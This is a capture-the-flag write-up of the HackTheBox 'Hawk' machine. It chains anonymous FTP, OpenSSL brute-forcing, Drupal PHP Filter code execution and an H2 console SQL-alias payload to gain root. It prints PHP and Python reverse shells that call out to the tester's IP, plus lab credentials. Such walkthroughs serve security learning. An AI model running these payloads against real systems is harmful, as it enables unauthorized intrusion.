# HackTheBox: Hawk Machine Writeup

## Overview

This repository contains a comprehensive penetration testing writeup for the **Hawk** machine on HackTheBox. Hawk is a medium-difficulty Linux machine that demonstrates multiple attack vectors including anonymous FTP access, encrypted file cracking, Drupal exploitation, and privilege escalation through H2 database exploitation.

**Machine Details:**
- Difficulty: Medium
- IP Address: 10.129.95.193
- OS: Linux (Ubuntu)

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Access](#initial-access)
4. [Privilege Escalation](#privilege-escalation)
5. [Root Access](#root-access)
6. [Key Findings](#key-findings)

---

## Reconnaissance

### Port Scanning

Initial network reconnaissance was performed using Nmap to identify open ports and running services.

```bash
nmap -sV -sC 10.129.95.193
```

**Initial Scan Results:**
- Port 21/tcp: FTP (vsftpd 3.0.3)
- Port 22/tcp: SSH (OpenSSH 7.6p1 Ubuntu 4)
- Port 80/tcp: HTTP (Apache 2.4.29)
- Port 8082/tcp: H2 Database Console

### Full Port Scan

A comprehensive port scan revealed additional open ports:

```bash
nmap -p- 10.129.95.193
```

**Additional Open Ports Discovered:**
- Port 5435/tcp: sceanics service
- Port 9092/tcp: XmlIpcRegSvc (H2 Java SQL server)

---

## Enumeration

### FTP Service Analysis

The FTP service allowed anonymous login, which was immediately identified as a potential entry point.

```bash
Connected to 10.129.95.193
Name: anonymous
ftp> ls
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages

ftp> cd messages
ftp> ls
-rw-r--r--    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
```

### Encrypted File Discovery

An encrypted file named `.drupal.txt.enc` was discovered in the FTP messages directory. This file was downloaded for further analysis.

```bash
ftp> get .drupal.txt.enc
```

**File Analysis:**
```
file .drupal.txt.enc
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
```

**File Content (Base64 Encoded):**
```
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
```

### OpenSSL Encryption Cracking

The encrypted file was decrypted using a brute-force approach with rockyou.txt wordlist.

**Tool Used:**
```bash
python3 decrypt-openssl-bruteforce.py -i drupal.txt.enc -w /usr/share/wordlists/rockyou.txt -s -v -o out1.txt
```

**Alternative Approach:**
```bash
bruteforce-salted-openssl -t q0 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 .drupal.txt.enc
```

**Repository Reference:** https://github.com/thosearetheguise/decrypt-openssl-bruteforce.git

### Decrypted Content

After successful decryption, the file revealed critical credentials:

```
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

**Credentials Obtained:**
- Username: admin
- Password: PencilKeyboardScanner123

### Web Application Analysis

HTTP service enumeration revealed a Drupal 7 installation running on port 80.

```bash
nmap -sV 10.129.95.193:80
```

**HTTP Service Details:**
- Server: Apache 2.4.29 (Ubuntu)
- CMS: Drupal 7
- Title: Welcome to 192.168.56.103

**Robots.txt Entries:**
- Disallowed paths: /includes/, /misc/, /modules/, /profiles/, /scripts/, /themes/
- Administrative paths: /admin/, /user/login/, /user/register/
- System files: CHANGELOG.txt, LICENSE.txt, MAINTAINERS.txt

---

## Initial Access

### Drupal Authentication

Using the credentials obtained from the encrypted FTP file, authentication to the Drupal portal was successful.

**Login Details:**
- Username: admin
- Password: PencilKeyboardScanner123

### PHP Filter Module Exploitation

With administrative privileges, the PHP Filter module was enabled to allow PHP code execution within content.

**Steps Performed:**

1. Navigate to Admin Dashboard
2. Enable PHP Filter Module
3. Create a new Basic Page
4. Select PHP Filter as text format
5. Embed PHP reverse shell code

### Reverse Shell Payload

The following PHP reverse shell was embedded:

```php
<?php
$sock=fsockopen("10.10.15.95",4444);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

### Initial Shell Access

```bash
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.95.193 40308
```

**Shell Output:**
```
Linux hawk 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Shell Stabilization

The initial shell was stabilized for improved usability:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Background the Process:**
```bash
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Privilege Escalation

### Database Credentials Discovery

While exploring the system, the Drupal database configuration file was located and examined.

**File Path:** `/var/www/html/sites/default/settings.php`

**Database Credentials Found:**
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'drupal4hawk',
      'host' => 'localhost',
      'driver' => 'mysql',
```

### Lateral Movement

The database password was reused for the system user account (common configuration weakness).

```bash
www-data@hawk:/home/daniel$ su daniel
Password: drupal4hawk
```

**Successful User Elevation:**
```
daniel@hawk:~$
```

### User Flag

The user.txt flag was located in the daniel home directory:

```bash
cat /home/daniel/user.txt
```

---

## Root Access

### H2 Database Discovery

During enumeration, the H2 Java SQL database service was discovered running on port 9092 (and accessible via HTTP on port 8082). This service was running with elevated privileges.

**Service Details:**
- H2 Console HTTP Interface: Port 8082
- H2 TCP Server: Port 9092

### Local Port Forwarding

SSH port forwarding was established to access the H2 Console locally:

```bash
ssh -L 8082:localhost:8082 daniel@10.129.95.193
```

This allowed secure access to the H2 Console through the local machine on port 8082.

### H2 Console Exploitation

The H2 database console allowed arbitrary code execution through SQL aliases. A custom alias function was created to execute system commands.

**SQL Payload - Command Execution:**

```sql
CREATE ALIAS SHELLEXEC AS $$ 
  String shellexec(String cmd) throws java.io.IOException { 
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); 
    return s.hasNext() ? s.next() : "";  
  }
$$;
CALL SHELLEXEC('id')
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

### Reverse Shell Execution

For full interactive shell access, a Python reverse shell script was created:

**Script Creation:**
```bash
cat > /tmp/exec.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.15.95",8080))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
EOF
```

**Execution via H2 Console:**

```sql
CREATE ALIAS SHELLEXEC AS $$ 
  String shellexec(String cmd) throws java.io.IOException { 
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); 
    return s.hasNext() ? s.next() : "";  
  }
$$;
CALL SHELLEXEC('python3 /tmp/exec.py')
```

**Root Shell Access:**
```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

The root flag was successfully retrieved:

```bash
# cat /root/root.txt
```

---

## Key Findings

### Vulnerabilities Exploited

1. **Anonymous FTP Access:** The FTP service allowed anonymous login without authentication, exposing sensitive encrypted files.

2. **Weak Encryption Implementation:** The OpenSSL encrypted file used a weak or predictable password ("friends"), allowing brute-force decryption with common wordlists.

3. **Credential Hardcoding:** Administrative credentials were stored in plaintext within FTP-accessible files and then reused across multiple systems.

4. **Drupal CMS Misconfig:** The PHP Filter module was enabled, allowing authenticated administrators to execute arbitrary PHP code.

5. **Weak Password Reuse:** Database credentials were reused for system user accounts, enabling lateral movement.

6. **Unprotected H2 Database:** The H2 database console was accessible without authentication and allowed arbitrary code execution through SQL aliases.

7. **Privilege Escalation via H2:** The H2 service ran with root privileges, providing a direct path to root access.

### Security Recommendations

1. Disable anonymous FTP access or implement strong access controls
2. Use strong, unique encryption passwords for sensitive files
3. Never store credentials in configuration files; use secure credential management systems
4. Disable dangerous CMS modules (PHP Filter) in production environments
5. Implement principle of least privilege for database service accounts
6. Restrict access to management consoles like H2 with network-level controls and authentication
7. Use different credentials for database accounts vs. system accounts
8. Implement Web Application Firewall (WAF) rules for CMS security

---

## Tools Used

- **Nmap:** Network reconnaissance and service enumeration
- **FTP Client:** Anonymous FTP access and file transfer
- **decrypt-openssl-bruteforce.py:** OpenSSL encryption cracking
- **Netcat:** Reverse shell listener and connection handling
- **SSH:** Secure remote access and port forwarding
- **H2 Console:** Database management and code execution

---

## References

- HackTheBox: https://www.hackthebox.com/
- Drupal Security: https://www.drupal.org/security
- H2 Database: https://www.h2database.com/
- OpenSSL Documentation: https://www.openssl.org/docs/
- decrypt-openssl-bruteforce: https://github.com/thosearetheguise/decrypt-openssl-bruteforce

---

## Author

**Naval** | Cybersecurity Specialist | Red Team  
GitHub: [@naval0505](https://github.com/naval0505)

---

**Disclaimer:** This writeup is for educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting any security testing.
